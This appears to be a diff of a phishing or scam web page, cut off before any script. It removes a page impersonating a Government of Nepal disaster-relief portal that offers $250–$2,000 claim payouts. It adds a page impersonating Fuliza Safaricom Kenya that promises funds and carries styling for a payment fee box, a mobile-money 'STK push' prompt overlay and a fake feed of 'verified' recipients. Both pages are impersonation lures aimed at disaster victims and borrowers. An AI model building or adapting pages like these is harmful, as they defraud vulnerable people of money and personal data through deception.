-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Fuliza Safaricom Kenya</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        /* ── Reset & Base ── */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0d5f2f; color: #212529; min-height: 100vh; margin: 0; padding: 0; }
+        :root { --primary: #0d5f2f; --primary-dark: #073a1c; --primary-light: #e8f5e9; --gold: #c9a84c; --gold-light: #f5edd6; --red: #fa5252; --gray: #f8f9fa; --border: #ced4da; }
+        .viewport-wrapper { width: 100%; display: flex; flex-direction: column; align-items: center; padding: 16px 12px 60px; }
+        .header-pill { background: rgba(255,255,255,0.12); border: 1px solid rgba(255,255,255,0.25); border-radius: 50px; padding: 10px 24px; color: white; font-size: 0.85rem; font-weight: 700; margin: 8px 0 20px 0; display: inline-flex; align-items: center; justify-content: center; gap: 8px; letter-spacing: 0.5px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        .container { width: 100%; max-width: 440px; background: #ffffff; border-radius: 24px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+        .page { display: none; animation: fadeIn 0.3s ease; }
+        .page.active { display: block; }
+        @keyframes fadeIn { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }
+        .card-content { padding: 24px 20px; }
+        .card-title { font-size: 1.4rem; font-weight: 800; color: #212529; margin-bottom: 8px; line-height: 1.3; text-align: center; }
+        .card-sub { font-size: 0.8rem; color: #6c757d; margin-bottom: 24px; text-align: center; line-height: 1.4; }
+        .form-row { display: flex; gap: 12px; margin-bottom: 14px; }
+        .form-row > .form-group { flex: 1; margin-bottom: 0; }
+        .form-group { margin-bottom: 14px; }
+        .form-group label { display: block; font-size: 0.75rem; font-weight: 700; color: #212529; margin-bottom: 6px; }
+        .form-group label .required { color: var(--red); margin-left: 2px; }
+        .input-wrapper { position: relative; width: 100%; }
+        .input-wrapper input, .input-wrapper select { width: 100%; height: 48px; padding: 0 36px 0 12px; border: 1.5px solid #a5b4fc; border-radius: 10px; font-family: inherit; font-size: 0.95rem; background: white; outline: none; transition: all 0.2s ease; color: #212529; }
+        .input-wrapper input::placeholder { color: #adb5bd; }
+        .input-wrapper input:focus, .input-wrapper select:focus { border-color: #0e6231; box-shadow: 0 0 0 3px rgba(14,98,49,0.1); }
+        .status-icon { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); pointer-events: none; display: flex; align-items: center; justify-content: center; width: 20px; height: 20px; font-weight: 800; }
+        .input-wrapper.valid input, .input-wrapper.valid select { border-color: #0ca678; }
+        .input-wrapper.valid .status-icon::after { content: "✓"; color: #0ca678; font-size: 1.2rem; }
+        .input-wrapper.invalid input, .input-wrapper.invalid select { border-color: var(--red); background-color: #fff5f5; }
+        .input-wrapper.invalid .status-icon::after { content: "✕"; color: var(--red); font-size: 1rem; }
+        .error-msg { color: var(--red); font-size: 0.72rem; margin-top: 4px; display: none; font-weight: 500; }
+        .input-wrapper.invalid + .error-msg { display: block; }
+        .btn-primary { width: 100%; height: 52px; background: #1b49b5; color: white; border: none; border-radius: 10px; font-size: 1rem; font-weight: 700; cursor: pointer; transition: background 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 10px; }
+        .btn-primary:hover { background: #123485; }
+        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
+        .btn-outline { background: transparent; border: 1.5px solid #1b49b5; color: #1b49b5; border-radius: 10px; font-weight: 700; cursor: pointer; transition: all 0.2s; padding: 14px; }
+        .btn-outline:hover { background: #f0f4ff; }
+        .btn-green { background: #0d5f2f; }
+        .btn-green:hover { background: #073a1c; }
+        .btn-red { background: #c62828; }
+        .btn-red:hover { background: #a32020; }
+        .btn-gold { background: var(--gold); color: #ffffff; }
+        .btn-gold:hover { background: #b5943c; }
+        .approved-badge-card { background: #e9ecef; border-radius: 8px; padding: 12px; display: flex; flex-direction: column; align-items: center; justify-content: center; margin-top: 20px; font-weight: 700; font-size: 0.72rem; color: #495057; text-align: center; letter-spacing: 0.3px; }
+        .approved-badge-card .flag-below { margin-top: 4px; font-size: 1.1rem; }
+        .card-header-green { background: linear-gradient(135deg, #1a7a3a, #0c5225); color: #ffffff; padding: 24px 20px; border-radius: 24px 24px 0 0; }
+        .card-header-green .step-info { font-size: 0.72rem; opacity: 0.9; font-weight: 600; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .card-header-green .step-title { font-size: 1.2rem; font-weight: 700; margin-bottom: 8px; line-height: 1.3; }
+        .card-header-green .step-sub { font-size: 0.85rem; opacity: 0.9; line-height: 1.4; }
+        .card-body-white { padding: 20px; background: #ffffff; }
+        .card-header-red { background: #c62828; color: #ffffff; padding: 24px 20px; border-radius: 24px 24px 0 0; }
+        .card-header-gold { background: linear-gradient(135deg, #c9a84c, #b5943c); color: #ffffff; padding: 24px 20px; border-radius: 24px 24px 0 0; }
+        .card-header-gold .step-info { font-size: 0.72rem; opacity: 0.9; font-weight: 600; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .card-header-gold .step-title { font-size: 1.2rem; font-weight: 700; margin-bottom: 8px; line-height: 1.3; }
+        .card-header-gold .step-sub { font-size: 0.85rem; opacity: 0.9; line-height: 1.4; }
+        .check-item { display: flex; align-items: center; gap: 12px; padding: 14px 16px; border: 1.5px solid #eef2f6; border-radius: 12px; margin-bottom: 10px; transition: all 0.3s ease; background: #ffffff; text-align: left; }
+        .check-item.pending { border-style: dashed; opacity: 0.55; }
+        .check-item.active { border-color: #1b49b5; border-style: dashed; background: #f0f4ff; }
+        .check-item.completed { border-color: #c3e6cb; background: #f4faf6; color: #155724; font-weight: 600; }
+        .check-circle { width: 24px; height: 24px; border-radius: 50%; border: 2px solid #ced4da; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-weight: bold; font-size: 0.8rem; position: relative; }
+        .check-item.active .check-circle { border-color: #1b49b5; border-top-color: transparent; animation: spin 0.8s linear infinite; }
+        .check-item.completed .check-circle { background: #28a745; border-color: #28a745; color: white; }
+        .check-item.completed .check-circle::after { content: "✓"; }
+        .eligibility-spinner { width: 80px; height: 80px; border: 6px solid #eef2f6; border-top-color: #1b49b5; border-radius: 50%; animation: spin 1s linear infinite; margin: 16px auto 24px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .proc-modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.45); backdrop-filter: blur(4px); display: none; align-items: center; justify-content: center; z-index: 3000; padding: 16px; }
+        .proc-modal-overlay.open { display: flex; }
+        .proc-modal-box { background: #ffffff; border-radius: 20px; width: 100%; max-width: 480px; padding: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.25); display: grid; grid-template-columns: 1.25fr 1fr; gap: 20px; text-align: left; align-items: center; }
+        @media (max-width: 420px) { .proc-modal-box { grid-template-columns: 1fr; gap: 16px; text-align: center; } }
+        .proc-left { display: flex; flex-direction: column; gap: 12px; }
+        .proc-header { display: flex; gap: 12px; align-items: flex-start; }
+        @media (max-width: 420px) { .proc-header { justify-content: center; } }
+        .proc-badge { background: #0d5f2f; color: white; font-weight: 800; font-size: 0.65rem; padding: 12px 6px; border-radius: 6px; text-align: center; min-width: 60px; line-height: 1.1; letter-spacing: 0.5px; }
+        .proc-title-block { font-size: 0.65rem; font-weight: 700; color: #1e3a8a; line-height: 1.3; text-align: left; }
+        .proc-title-block strong { font-size: 0.85rem; display: block; margin-top: 1px; letter-spacing: 0.3px; }
+        .proc-status-text { font-weight: 700; font-size: 0.85rem; color: #212529; margin-top: 4px; }
+        .proc-dots { display: flex; gap: 6px; margin-top: 2px; }
+        @media (max-width: 420px) { .proc-dots { justify-content: center; margin-bottom: 8px; } }
+        .proc-dots span { width: 8px; height: 8px; background-color: #3b82f6; border-radius: 50%; animation: procDotPulse 1.2s infinite ease-in-out both; }
+        .proc-dots span:nth-child(1) { animation-delay: -0.32s; }
+        .proc-dots span:nth-child(2) { animation-delay: -0.16s; }
+        @keyframes procDotPulse { 0%,80%,100% { transform: scale(0); } 40% { transform: scale(1); } }
+        .proc-right { font-size: 0.72rem; color: #6c757d; line-height: 1.45; border-left: 1px solid #e9ecef; padding-left: 20px; text-align: left; }
+        @media (max-width: 420px) { .proc-right { border-left: none; padding-left: 0; border-top: 1px solid #e9ecef; padding-top: 16px; text-align: center; } }
+        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.5); backdrop-filter: blur(4px); display: none; align-items: center; justify-content: center; z-index: 3000; padding: 20px; }
+        .modal-overlay.open { display: flex; }
+        .modal-box { background: white; border-radius: 20px; padding: 28px 24px; width: 100%; max-width: 400px; animation: modalIn 0.25s ease; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.25); }
+        @keyframes modalIn { from { opacity:0; transform:scale(0.95) translateY(16px); } to { opacity:1; transform:scale(1) translateY(0); } }
+        .modal-icon { width: 56px; height: 56px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; font-size: 1.6rem; }
+        .modal-icon.success { background: #e8f5e9; color: var(--primary); }
+        .modal-icon.error { background: #fce4ec; color: var(--red); }
+        .modal-icon.warning { background: #fff3e0; color: #e65100; }
+        .modal-title { font-size: 1.25rem; font-weight: 800; margin-bottom: 6px; }
+        .modal-desc { font-size: 0.85rem; color: #6c757d; margin-bottom: 16px; line-height: 1.45; }
+        .modal-phone-group { display: flex; border: 1.5px solid var(--border); border-radius: 10px; overflow: hidden; margin: 8px 0 12px; }
+        .modal-phone-group .prefix { background: var(--gray); padding: 12px 14px; font-weight: 600; border-right: 1.5px solid var(--border); color: #333; display: flex; align-items: center; }
+        .modal-phone-group input { flex: 1; border: none; padding: 12px 14px; font-family: inherit; font-size: 0.95rem; outline: none; }
+        /* ── Status removed ── */
+        .feed-container { max-height: 220px; overflow-y: auto; padding-right: 4px; }
+        .feed-item { display: flex; align-items: flex-start; gap: 10px; padding: 10px 12px; border-bottom: 1px solid #f0f0f0; animation: slideIn 0.3s ease; text-align: left; }
+        .feed-item:last-child { border-bottom: none; }
+        @keyframes slideIn { from { opacity:0; transform:translateX(-10px); } to { opacity:1; transform:none; } }
+        .feed-avatar { width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 0.8rem; color: white; flex-shrink: 0; }
+        .feed-content { flex: 1; }
+        .feed-name { font-weight: 700; font-size: 0.85rem; color: #212529; }
+        .feed-name .verified { color: #0ca678; font-size: 0.65rem; margin-left: 4px; font-weight: 600; }
+        .feed-text { font-size: 0.8rem; color: #495057; margin-top: 2px; line-height: 1.35; }
+        .feed-time { font-size: 0.65rem; color: #868e96; margin-top: 2px; }
+        .feed-live { display: inline-block; background: var(--red); color: white; font-size: 0.55rem; font-weight: 800; padding: 2px 8px; border-radius: 10px; animation: pulse 1.5s infinite; letter-spacing: 0.3px; }
+        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
+        .nav-header { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; }
+        .back-btn { background: none; border: none; font-size: 1.5rem; cursor: pointer; color: #ffffff; display: flex; align-items: center; justify-content: center; width: 36px; height: 36px; border-radius: 50%; transition: background 0.2s; }
+        .back-btn:hover { background: rgba(255,255,255,0.15); }
+        .footer { text-align: center; padding: 20px 16px 0; font-size: 0.65rem; color: rgba(255,255,255,0.65); line-height: 1.5; max-width: 440px; width: 100%; }
+        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #212529; color: white; padding: 12px 24px; border-radius: 12px; font-size: 0.85rem; font-weight: 600; z-index: 4000; display: none; max-width: 90%; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+        .toast.show { display: block; animation: slideUp 0.3s ease; }
+        @keyframes slideUp { from { opacity:0; transform:translateX(-50%) translateY(20px); } to { opacity:1; transform:translateX(-50%) translateY(0); } }
+        .spinner { width: 18px; height: 18px; border: 2px solid #e0e0e0; border-top-color: #ffffff; border-radius: 50%; animation: spin 0.8s linear infinite; display: inline-block; }
+        .stk-waiting-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(8px); display: none; align-items: center; justify-content: center; z-index: 5000; padding: 20px; }
+        .stk-waiting-overlay.open { display: flex; }
+        .stk-waiting-box { background: white; border-radius: 24px; padding: 32px 24px; max-width: 400px; width: 100%; text-align: center; animation: fadeIn 0.3s ease; }
+        .stk-waiting-box .pulse-icon { width: 72px; height: 72px; border: 6px solid #e0e0e0; border-top-color: #0d5f2f; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        .stk-waiting-box .title { font-size: 1.2rem; font-weight: 800; color: #1b49b5; margin-bottom: 8px; }
+        .stk-waiting-box .sub { font-size: 0.9rem; color: #333; margin-bottom: 6px; }
+        .stk-waiting-box .phone { font-weight: 700; color: #0d5f2f; }
+        .stk-waiting-box .dots { display: flex; justify-content: center; gap: 8px; margin: 20px 0; }
+        .stk-waiting-box .dots span { width: 10px; height: 10px; background: #1b49b5; border-radius: 50%; animation: procDotPulse 1.2s infinite ease-in-out both; }
+        .stk-waiting-box .dots span:nth-child(1) { animation-delay: -0.32s; }
+        .stk-waiting-box .dots span:nth-child(2) { animation-delay: -0.16s; }
+        .stk-waiting-box .listening { background: #e8f5e9; border-radius: 24px; padding: 8px 16px; font-size: 0.78rem; color: #0d5f2f; font-weight: 700; display: inline-flex; align-items: center; gap: 6px; }
+        .stk-waiting-box .listening .dot { width: 8px; height: 8px; background: #0ca678; border-radius: 50%; display: inline-block; animation: pulse 1.5s infinite; }
+        .stk-waiting-box .note { font-size: 0.68rem; color: #adb5bd; margin-top: 14px; }
+        .fee-section { background: #f5edd6; border: 2px solid #c9a84c; border-radius: 12px; padding: 16px 18px; margin: 16px 0; text-align: center; }
+        .fee-section .fee-label { font-size: 0.72rem; color: #666; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
+        .fee-section .fee-amount { font-size: 2rem; font-weight: 900; color: #b85c00; margin: 4px 0; }
+        .fee-section .fee-sub { font-size: 0.75rem; color: #555; font-weight: 500; }
+        .success-summary { background: #f0faf4; border: 1px solid #b2dfdb; border-radius: 12px; padding: 14px; margin: 16px 0; text-align: left; font-size: 0.82rem; }
+        .success-summary .summary-title { font-weight: 800; color: #0d5f2f; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 10px; }
+        .success-summary .summary-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
+        .success-summary .summary-row:last-child { margin-bottom: 0; }
+        .success-summary .summary-row .label { color: #6c757d; }
+        .success-summary .summary-row .value { font-weight: 700; color: #212529; }
+        .success-summary .summary-row .value.amount { color: #0d5f2f; }
+        .success-summary .summary-row .value.network { color: #0d5f2f; }
+        .sending-indicator { display: inline-flex; align-items: center; gap: 8px; font-size: 0.82rem; color: #0ca678; font-weight: 700; margin-bottom: 12px; justify-content: center; width: 100%; }
+        .sending-indicator .dot { width: 10px; height: 10px; background: #0ca678; border-radius: 50%; display: inline-block; }
+    </style>
 </head>
-<body>
+<body style="background: #1a7a3a !important;">
 
-<div class="portal-container">
+    <!-- ─── TOAST (only used for form validation) ─── -->
+    <div id="toast" class="toast"></div>
 
-  <!-- ========================================================================
-       TOP GOVERNMENT HEADER
-       ======================================================================== -->
-  <header class="gov-header">
-    <div class="gov-branding">
-      <svg class="gov-emblem" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-        <circle cx="50" cy="50" r="48" fill="#d32f2f" stroke="#ffffff" stroke-width="2"/>
-        <path d="M15,65 Q50,45 85,65 L85,78 Q50,62 15,78 Z" fill="#b71c1c" />
-        <polygon points="50,22 64,52 36,52" fill="#ffffff"/>
-        <polygon points="34,30 48,54 20,54" fill="#ffffff"/>
-        <polygon points="66,30 80,54 52,54" fill="#ffffff"/>
-        <polygon points="50,26 62,50 38,50" fill="#e0f2fe"/>
-        <circle cx="50" cy="58" r="9" fill="#ffd54f"/>
-        <path d="M42,57 C45,54 55,54 58,57 L54,64 L46,64 Z" fill="#c49000"/>
-        <circle cx="20" cy="46" r="4" fill="#ff1744"/>
-        <circle cx="24" cy="36" r="4" fill="#ff1744"/>
-        <circle cx="32" cy="27" r="4" fill="#ff1744"/>
-        <circle cx="42" cy="21" r="4" fill="#ff1744"/>
-        <circle cx="58" cy="21" r="4" fill="#ff1744"/>
-        <circle cx="68" cy="27" r="4" fill="#ff1744"/>
-        <circle cx="76" cy="36" r="4" fill="#ff1744"/>
-        <circle cx="80" cy="46" r="4" fill="#ff1744"/>
-        <rect x="18" y="78" width="64" height="12" rx="3" fill="#ffebee" stroke="#b71c1c" stroke-width="1"/>
-        <text x="50" y="87" font-size="6.5" font-family="Arial, sans-serif" font-weight="bold" fill="#b71c1c" text-anchor="middle">जननी जन्मभूमिश्च स्वर्गादपि गरीयसी</text>
-      </svg>
-      <div class="gov-text">
-        <h2>Government of Nepal</h2>
-        <h1>Nepal Disaster Risk Reduction Portal</h1>
-        <p>Kathmandu, Nepal</p>
-      </div>
-    </div>
-
-    <div class="gov-flag-box">
-      <svg class="gov-flag" viewBox="0 0 80 100" xmlns="http://www.w3.org/2000/svg">
-        <polygon points="8,6 74,48 30,48 74,94 8,94" fill="#003893"/>
-        <polygon points="12,12 65,46 26,46 65,88 12,88" fill="#DC143C"/>
-        <path d="M22,33 A7,7 0 0,0 36,33 A6,6 0 0,1 24,33 Z" fill="#ffffff"/>
-        <circle cx="29" cy="32" r="3" fill="#ffffff"/>
-        <circle cx="29" cy="68" r="6" fill="#ffffff"/>
-        <polygon points="29,59 31,63 29,61 27,63" fill="#ffffff"/>
-        <polygon points="29,77 31,73 29,75 27,73" fill="#ffffff"/>
-        <polygon points="20,68 24,70 22,68 24,66" fill="#ffffff"/>
-        <polygon points="38,68 34,70 36,68 34,66" fill="#ffffff"/>
-      </svg>
-    </div>
-  </header>
-
-  <!-- ========================================================================
-       MAIN BLUE NAVIGATION BAR
-       ======================================================================== -->
-  <nav class="main-nav">
-    <ul class="nav-links">
-      <li class="active" id="nav-home-btn"><a href="#" onclick="showPage('portal'); return false;">Home</a></li>
-      <li><a href="#">PM Relief <span class="nav-dropdown-caret">▼</span></a></li>
-      <li><a href="#">Relief Distributed <span class="nav-dropdown-caret">▼</span></a></li>
-      <li><a href="#">Press Release <span class="nav-dropdown-caret">▼</span></a></li>
-      <li><a href="#">Volunteer</a></li>
-      <li><a href="#">Feedback</a></li>
-      <li><a href="#">COVID19 <span class="nav-dropdown-caret">▼</span></a></li>
-      <li><a href="#">Earthquake 2015 <span class="nav-dropdown-caret">▼</span></a></li>
-      <li><a href="#">Monsoon 2078 BS</a></li>
-      <li><a href="#">Contact Persons <span class="nav-dropdown-caret">▼</span></a></li>
-    </ul>
-
-    <div class="nav-claim-highlight" onclick="showPage('claim')">
-      💰 Claim Relief Assistance ($250 - $2,000 USD) →
-    </div>
-  </nav>
-
-  <!-- ========================================================================
-       PAGE 1: MAIN PORTAL VIEW
-       ======================================================================== -->
-  <div id="page-portal">
-
-    <!-- MAJOR UPDATES TICKER -->
-    <div class="ticker-section">
-      <div class="ticker-title">
-        MAJOR UPDATES
-      </div>
-      <div class="ticker-content">
-        <a href="#">बर्दिया विपद् पूर्वतयारी तथा प्रतिकार्य योजना (DPRP) २०८३</a>
-        <a href="#">प्रेस विज्ञप्ति (मिति २०८३।०३।२६)</a>
-        <a href="#">मिति २०८३।०५।१९ गते १३:०० बजे सम्मको राजमार्ग विवरण ।</a>
-        <div class="ticker-hotline">
-          विपद् सम्बन्धी सूचना, समस्या, गुनासो र सुझावका लागि हटलाइन नम्बर <span style="color:#d32f2f; font-weight:700;">११४९</span> मा सम्पर्क गर्नुहुन अनुरोध।
-        </div>
-      </div>
-    </div>
-
-    <!-- EMERGENCY STRIP -->
-    <div class="emergency-strip-container">
-      <div class="emergency-strip-heading">
-        <span class="strip-title-badge">⚡ EMERGENCY RELIEF CLAIM ACCESS</span>
-        <span class="strip-subtitle">Affected by recent incidents? Click any button below to claim your money assistance:</span>
-      </div>
-      <div class="emergency-buttons-row">
-        <button class="action-push-btn btn-theme-landslide" onclick="showPage('claim')">
-          <div class="push-btn-top">
-            <span>⛰️ Landslide</span>
-            <span class="push-btn-count">90</span>
-          </div>
-          <div style="font-size:11px; font-weight:700; opacity:0.95;">$250 – $2,000 USD</div>
-          <div class="push-btn-claim-tag">Claim Relief →</div>
-        </button>
-        <button class="action-push-btn btn-theme-snakebite" onclick="showPage('claim')">
-          <div class="push-btn-top">
-            <span>💉 Snake Bite</span>
-            <span class="push-btn-count">56</span>
-          </div>
-          <div style="font-size:11px; font-weight:700; opacity:0.95;">$250 – $2,000 USD</div>
-          <div class="push-btn-claim-tag">Claim Aid →</div>
-        </button>
-        <button class="action-push-btn btn-theme-fire" onclick="showPage('claim')">
-          <div class="push-btn-top">
-            <span>🔥 Fire</span>
-            <span class="push-btn-count">27</span>
-          </div>
-          <div style="font-size:11px; font-weight:700; opacity:0.95;">$250 – $2,000 USD</div>
-          <div class="push-btn-claim-tag">Claim Aid →</div>
-        </button>
-        <button class="action-push-btn btn-theme-flood" onclick="showPage('claim')">
-          <div class="push-btn-top">
-            <span>🌊 Flood</span>
-            <span class="push-btn-count">23</span>
-          </div>
-          <div style="font-size:11px; font-weight:700; opacity:0.95;">$250 – $2,000 USD</div>
-          <div class="push-btn-claim-tag">Claim Relief →</div>
-        </button>
-        <button class="action-push-btn btn-theme-rainfall" onclick="showPage('claim')">
-          <div class="push-btn-top">
-            <span>🌧️ Rainfall</span>
-            <span class="push-btn-count">17</span>
-          </div>
-          <div style="font-size:11px; font-weight:700; opacity:0.95;">$250 – $2,000 USD</div>
-          <div class="push-btn-claim-tag">Claim Relief →</div>
-        </button>
-      </div>
-    </div>
-
-    <!-- 3-COLUMN DASHBOARD -->
-    <div class="dashboard-grid">
-
-      <!-- COLUMN 1: REPORTS -->
-      <aside class="reports-sidebar">
-        <div class="reports-header">Reports</div>
-        <ul class="reports-list">
-          <li><a href="#">DRR Acts and policies</a></li>
-          <li><a href="#">National DRR Policy and Strategic Action Plan</a></li>
-          <li><a href="#">All DRR Document</a></li>
-          <li><a href="#">Nepal Risk Information</a></li>
-          <li><a href="#">About Nepal</a></li>
-          <li><a href="#">Disaster Focal Person</a></li>
-          <li><a href="#">Incident Maps</a></li>
-          <li><a href="#">Videos</a></li>
-        </ul>
-      </aside>
-
-      <!-- COLUMN 2: MAP -->
-      <main class="map-container">
-        <div class="map-header">EOCs in Nepal</div>
-        <div class="map-body">
-          <div class="map-subtext">
-            <span>Ministry of Home Affairs - National Emergency Operation Center</span>
-            <strong>Network of Emergency Operation Centers (EOCs) in Nepal</strong>
-          </div>
-          <svg class="nepal-svg-wrap" viewBox="0 0 620 300" xmlns="http://www.w3.org/2000/svg">
-            <defs>
-              <linearGradient id="mapGrad" x1="0%" y1="0%" x2="100%" y2="100%">
-                <stop offset="0%" stop-color="#ffb74d" />
-                <stop offset="50%" stop-color="#ffa726" />
-                <stop offset="100%" stop-color="#fb8c00" />
-              </linearGradient>
-            </defs>
-            <path d="M 30,120 Q 75,90 120,70 Q 175,60 240,75 Q 320,105 380,125 Q 450,150 510,180 Q 570,210 595,245 Q 560,265 490,265 Q 410,250 340,230 Q 260,225 190,220 Q 120,205 60,180 Q 25,150 30,120 Z" fill="url(#mapGrad)" stroke="#c76d00" stroke-width="2.5" />
-            <path d="M 120,70 Q 110,140 120,205" stroke="#ffffff" stroke-width="1.5" stroke-dasharray="3,3" fill="none"/>
-            <path d="M 210,68 Q 200,150 215,220" stroke="#ffffff" stroke-width="1.5" stroke-dasharray="3,3" fill="none"/>
-            <path d="M 300,95 Q 295,160 305,225" stroke="#ffffff" stroke-width="1.5" stroke-dasharray="3,3" fill="none"/>
-            <path d="M 380,125 Q 375,180 385,238" stroke="#ffffff" stroke-width="1.5" stroke-dasharray="3,3" fill="none"/>
-            <path d="M 470,165 Q 460,210 470,255" stroke="#ffffff" stroke-width="1.5" stroke-dasharray="3,3" fill="none"/>
-            <text x="65" y="145" font-size="10" font-weight="bold" fill="#5c2d00">Sudurpashchim</text>
-            <text x="150" y="130" font-size="10" font-weight="bold" fill="#5c2d00">Karnali</text>
-            <text x="245" y="150" font-size="10" font-weight="bold" fill="#5c2d00">Lumbini</text>
-            <text x="330" y="165" font-size="10" font-weight="bold" fill="#5c2d00">Gandaki</text>
-            <text x="415" y="195" font-size="10" font-weight="bold" fill="#5c2d00">Bagmati</text>
-            <text x="495" y="225" font-size="10" font-weight="bold" fill="#5c2d00">Madhesh</text>
-            <text x="535" y="210" font-size="10" font-weight="bold" fill="#5c2d00">Koshi</text>
-            <circle cx="430" cy="190" r="7" fill="#d32f2f" stroke="#ffffff" stroke-width="2"/>
-            <text x="430" y="180" font-size="9" font-weight="bold" fill="#990000" text-anchor="middle">Kathmandu (NEOC)</text>
-            <rect x="75" y="150" width="8" height="8" fill="#8b0000" stroke="#fff"/>
-            <rect x="160" y="140" width="8" height="8" fill="#8b0000" stroke="#fff"/>
-            <rect x="250" y="165" width="8" height="8" fill="#8b0000" stroke="#fff"/>
-            <rect x="345" y="175" width="8" height="8" fill="#8b0000" stroke="#fff"/>
-            <rect x="490" y="235" width="8" height="8" fill="#8b0000" stroke="#fff"/>
-            <rect x="545" y="225" width="8" height="8" fill="#8b0000" stroke="#fff"/>
-            <circle cx="50" cy="130" r="3.5" fill="#f57c00" stroke="#fff"/>
-            <circle cx="95" cy="115" r="3.5" fill="#f57c00" stroke="#fff"/>
-            <circle cx="130" cy="100" r="3.5" fill="#f57c00" stroke="#fff"/>
-            <circle cx="180" cy="120" r="3.5" fill="#f57c00" stroke="#fff"/>
-            <circle cx="210" cy="180" r="3.5" fill="#f57c00" stroke="#fff"/>
-            <circle cx="280" cy="140" r="3.5" fill="#f57c00" stroke="#fff"/>
-            <circle cx="360" cy="150" r="3.5" fill="#f57c00" stroke="#fff"/>
-            <circle cx="460" cy="180" r="3.5" fill="#f57c00" stroke="#fff"/>
-            <circle cx="510" cy="205" r="3.5" fill="#f57c00" stroke="#fff"/>
-            <circle cx="560" cy="245" r="3.5" fill="#f57c00" stroke="#fff"/>
-          </svg>
-
-          <div class="map-legend-row">
-            <div class="map-legend-items">
-              <span style="font-weight:700; margin-bottom:2px;">Legend:</span>
-              <div class="legend-item"><span class="dot-neoc"></span> NEOC (National)</div>
-              <div class="legend-item"><span class="dot-peoc"></span> PEOC (Provincial)</div>
-              <div class="legend-item"><span class="dot-deoc"></span> DEOC (District)</div>
+    <!-- =============================================================
+    PAGE 0: WELCOME PAGE
+    ============================================================= -->
+    <div id="welcomePage" class="page active">
+        <div style="background:#ffffff; width:100%; display:flex; justify-content:center; align-items:center; padding: 24px 16px;">
+            <div style="display:flex; flex-direction:column; align-items:center; padding:10px 0;">
+                <div style="font-size:2.4rem; font-weight:900; color:#1a7a3a; letter-spacing:3px; line-height:1.1;">FULIZA</div>
+                <div style="font-size:0.9rem; font-weight:800; color:#c62828; letter-spacing:2px; margin-top:2px;">SAFARICOM</div>
+                <div style="font-size:0.65rem; font-weight:600; color:#555; letter-spacing:1px; margin-top:4px;">Empowering Kenyans 🇰🇪</div>
             </div>
-            <div style="font-size: 10.5px; color:#666;">
-              Map Data: Department of Survey<br>Updated on: 2026-09-05
+        </div>
+
+        <div style="background:#1a7a3a; width:100%; display:flex; flex-direction:column; align-items:center; padding: 32px 16px 60px; min-height: calc(100vh - 143px);">
+            <div class="container">
+                <div class="card-content" style="padding: 32px 24px;">
+                    <div style="font-size: 1.05rem; font-weight: 500; color: #212529; line-height: 1.6; margin-bottom: 28px;">
+                        Hi 👋, Welcome to <strong>FULIZA SAFARICOM KENYA</strong>. We are going to take you through some few questions before you receive your funds. Are you ready for that?
+                    </div>
+                    <button class="btn-primary" style="background:#1a7a3a; margin-bottom: 12px; margin-top: 0;" onclick="startApplication()">
+                        Yes
+                    </button>
+                    <button class="btn-primary" style="background:#1a7a3a; margin-top: 0;" onclick="showToast('You must select Yes to request eligibility checks.')">
+                        No
+                    </button>
+                </div>
             </div>
-          </div>
-
-          <div class="map-totals-bar">
-            1 National EOC; 7 Provincial EOCs; 70 District EOCs
-          </div>
-        </div>
-      </main>
-
-      <!-- COLUMN 3: INCIDENTS SIDEBAR -->
-      <section class="incidents-summary-box">
-        <div class="incidents-header">
-          Reported No. of Incidents (Last 7 days)
-        </div>
-
-        <div class="incidents-action-notice">
-          <span>⚡</span>
-          <span>Click any button below to claim assistance:</span>
-        </div>
-
-        <div class="incidents-buttons-grid">
-          <button class="sidebar-btn-featured" onclick="showPage('claim')">
-            <div style="display:flex; align-items:center; gap:10px;">
-              <span style="font-size: 26px;">⛰️</span>
-              <div>
-                <div style="font-size:18px; font-weight:800;">Landslide (90)</div>
-                <div style="font-size:11px; opacity:0.9;">High Incident Region</div>
-              </div>
+            <div class="footer">
+                Fuliza Safaricom · Empowering Kenyans 🇰🇪
             </div>
-            <div style="background:#ffffff; color:#b71c1c; font-weight:800; font-size:11px; padding:4px 10px; border-radius:12px;">
-              CLAIM →
+        </div>
+    </div>
+
+    <!-- =============================================================
+    FORMS AREA
+    ============================================================= -->
+    <div class="viewport-wrapper" id="formsArea" style="display:none;">
+
+        <div class="header-pill">
+            <span>🇰🇪 FULIZA SAFARICOM KENYA</span>
+        </div>
+
+        <div class="container">
+
+            <!-- STEP 1: APPLICATION -->
+            <div id="step1" class="page">
+                <div class="card-content">
